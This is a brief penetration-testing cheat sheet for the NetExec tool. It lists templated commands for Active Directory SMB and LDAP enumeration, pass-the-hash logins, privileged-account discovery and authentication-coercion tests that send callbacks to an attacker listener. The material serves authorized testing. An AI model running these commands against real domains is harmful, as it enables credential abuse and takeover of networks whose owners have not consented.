# NetExec (nxc)

**Formerly:** CrackMapExec (cme)  
**Install:** `pipx install netexec`  
**Tags:** #tool #AD #windows #smb

---

## Overview
Swiss Army knife for Active Directory pentesting. Supports SMB, LDAP, WinRM, MSSQL, SSH and more.

## Common Usage

### SMB Enumeration
```bash
nxc smb <target> -u <user> -p <pass>
nxc smb <target> -u <user> -p <pass> --shares
nxc smb <target> -u <user> -p <pass> --users
nxc smb <target> -u <user> -p <pass> --groups
```

### Pass the Hash
```bash
nxc smb <target> -u <user> -H <NTLM_hash>
```

### LDAP Enumeration
```bash
# All domain users
nxc ldap <dc-ip> -u <user> -p <pass> --users

# Group membership
nxc ldap <dc-ip> -u <user> -p <pass> --groups "Domain Admins"
nxc ldap <dc-ip> -u <user> -p <pass> --groups "Enterprise Admins"

# AdminCount=1 — accounts that were ever in a privileged group
nxc ldap <dc-ip> -u <user> -p <pass> --admin-count

# Targeted query — get UPN + SID for a specific account
nxc ldap <dc-ip> -u <user> -p <pass> --query "(sAMAccountName=<target>)" "sAMAccountName objectSid userPrincipalName"

# Machine Account Quota
nxc ldap <dc-ip> -u <user> -p <pass> -M maq

# AD CS — find Certificate Authorities
nxc ldap <dc-ip> -u <user> -p <pass> -M adcs
```

### coerce_plus Module
Tests for authentication coercion vulnerabilities (PetitPotam, PrinterBug, DFSCoerce, MSEven).
```bash
nxc smb <target> -u <user> -p <pass> -M coerce_plus -o LISTENER=<your_IP>
```

### Targets
- Single IP: `192.168.1.10`
- Hostname: `dc01.domain.local`
- CIDR: `192.168.1.0/24`
- File (one per line): `targets.txt`

## Notes
- Requires valid domain creds for most modules
- `coerce_plus` requires a listener (e.g. [[tools/responder]]) running on LISTENER IP to capture callbacks
- Output: `VULNERABLE` = technique accepted; `Exploit Success` = RPC call fired

## Related
- [[tools/responder]]
- [[playbooks/ad-coercion-validation]]
